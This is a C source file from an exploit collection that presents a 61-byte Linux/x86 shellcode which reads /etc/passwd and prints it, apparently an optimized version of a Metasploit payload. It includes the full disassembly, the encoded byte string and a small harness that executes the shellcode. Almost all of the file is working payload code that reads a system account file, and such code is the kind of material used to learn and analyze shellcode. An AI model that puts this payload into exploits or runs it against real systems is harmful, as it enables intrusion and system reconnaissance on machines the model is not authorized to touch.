/* 
*  Title:    Read File (/etc/passwd) Shellcode (MSF Optimization) - 61 bytes
*  Platform: Linux/x86
*  Date:     13 September 2018
*  Author:   Ray Doyle (@doylersec)
*  Website:  http://www.doyler.net
*  
*  Description: This shellcode prints out the contents of /etc/passwd to STDOUT. The target file can be modified in the 'message' section of the shellcode.
*
*  For more information on this shellcode, please see the following blog post:
*  https://www.doyler.net/security-not-included/metasploit-shellcode-analysis
*/

/****************************************************
Disassembly of section .text:

08048060 <_start>:
 8048060:	eb 2b                	jmp    804808d <call_shellcode>

08048062 <shellcode>:
 8048062:	31 c0                	xor    eax,eax
 8048064:	b0 05                	mov    al,0x5
 8048066:	5b                   	pop    ebx
 8048067:	31 c9                	xor    ecx,ecx
 8048069:	cd 80                	int    0x80
 804806b:	89 c3                	mov    ebx,eax
 804806d:	b0 03                	mov    al,0x3
 804806f:	89 e7                	mov    edi,esp
 8048071:	89 f9                	mov    ecx,edi
 8048073:	31 d2                	xor    edx,edx
 8048075:	b6 10                	mov    dh,0x10
 8048077:	cd 80                	int    0x80
 8048079:	89 c2                	mov    edx,eax
 804807b:	31 c0                	xor    eax,eax
 804807d:	b0 04                	mov    al,0x4
 804807f:	31 db                	xor    ebx,ebx
 8048081:	b3 01                	mov    bl,0x1
 8048083:	cd 80                	int    0x80
 8048085:	31 c0                	xor    eax,eax
 8048087:	b0 01                	mov    al,0x1
 8048089:	31 db                	xor    ebx,ebx
 804808b:	cd 80                	int    0x80

0804808d <call_shellcode>:
 804808d:	e8 d0 ff ff ff       	call   8048062 <shellcode>

08048092 <message>:
 8048092:	2f                   	das    
 8048093:	65                   	gs
 8048094:	74 63                	je     80480f9 <message+0x67>
 8048096:	2f                   	das    
 8048097:	70 61                	jo     80480fa <message+0x68>
 8048099:	73 73                	jae    804810e <message+0x7c>
 804809b:	77 64                	ja     8048101 <message+0x6f>
****************************************************/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x2b\x31\xc0\xb0\x05\x5b\x31\xc9\xcd\x80\x89\xc3\xb0\x03\x89\xe7\x89\xf9\x31\xd2\xb6\x10\xcd\x80\x89\xc2\x31\xc0\xb0\x04\x31\xdb\xb3\x01\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xd0\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64";

main()
{
    printf("Shellcode Length: %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}